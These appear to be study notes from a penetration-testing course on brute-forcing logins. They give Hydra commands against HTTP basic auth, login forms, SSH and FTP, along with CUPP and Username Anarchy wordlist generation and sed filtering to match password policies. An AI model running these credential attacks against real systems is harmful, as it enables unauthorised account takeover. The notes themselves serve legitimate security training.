## Basic HTTP AUTH

- The HTTP specification provides two parallel authentication mechanisms:
	- `Basic HTTP AUTH` is used to authenticate the user to the HTTP server.
	- `Proxy Server Authentication` is used to authenticate the user to an intermediate proxy server.

- The Basic HTTP Authentication scheme uses user ID and password for authentication. 
	- The client sends a request without authentication information with its first request. 
	- The server's response contains the `WWW-Authenticate` header field, which requests the client to provide the credentials. 
		- This header field also defines details of how the authentication has to take place. 
	- The client is asked to submit the authentication information. 
	- In its response, the server transmits the so-called realm, a character string that tells the client who is requesting the data. 
	- The client uses the Base64 method for encoding the identifier and password. This encoded character string is transmitted to the server in the Authorization header field.

## Hydra Basics

``` bash
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
```
- `-C` - combined credentials wordlist
- `-s` - port
- `http-get` - method
- `/` - target path

## Username/Password Attack
`/usr/share/seclists/Usernames/Names/names.txt`

``` bash
hydra -L /usr/share/seclists/Usernames/Names/names.txt -P /usr/share/wordlists/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
```
- `-L` - username list
- `-P` - password list
- `-u` - Breadth first (tries all users on each password)
- `-f` - stop on first successful login

## Username Brute Force (Password Spray)
``` bash
hydra -L /opt/useful/SecLists/Usernames/Names/usernames.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /
```

# Login.php
- With an admin panel we need to attack a form instead of basic HTTP Auth.
	-  `http[s]-{head|get|post}` - basic HTTP auth
	-  `http[s]-post-form` - login forms

- First we need to determine whether the web app uses a GET or POST form.

- To find out how a module works use `-U`
``` bash
hydra http-post-form -U
```

- The post form requires three parameters separated by `:
	- `URL path` for the login form
	- `POST parameters` for username/password
	- `Success/Fail string`, to let hydra know if a login was successful.
```
/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:[FAIL/SUCCESS]=[success/failed string]
```

### Fail/Success String
- Since we cannot log in to see the response on success we can provide a string that appears on the logged-out page.
- A good strategy is to pick something from the HTML source that wouldn't be present on success.
	- `form name=login` is a good example
``` bash
hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

# Personalized Wordlists

## CUPP
- Will take personal information about the target and generate a wordlist
``` bash
cupp -i
```
- `-i` for interactive mode

### Password Policy
- If we know the password policy we should trim the wordlist to only include passwords that meet it.
	- Since hydra does not allow custom rules we will have to do it manually

``` bash
sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
```

### Mangling
- Generates more permutations
- Many great tools do word mangling and case permutation quickly and easily, like [rsmangler](https://github.com/digininja/RSMangler) or [The Mentalist](https://github.com/sc0tfree/mentalist.git). These tools have many other options, which can make any small wordlist reach millions of lines long. We should keep these tools in mind because we might need them in other modules and situations.

>Tip: The more mangled a wordlist is, the more chances you have to hit a correct password, but it will take longer to brute force. So, always try to be efficient, and properly customize your wordlist using the intelligence you gathered.

### Custom Username Wordlist

- [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)
- The simplest way to use is:
``` bash
./username-anarchy Bill Gates > bill.txt
```


# Service Brute Forcing

## SSH Attack

``` bash
hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
```
- `-t` - hydra recommends using fewer than usual threads because SSH limits the number of parallel connections

## FTP Brute Forcing
``` bash
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
```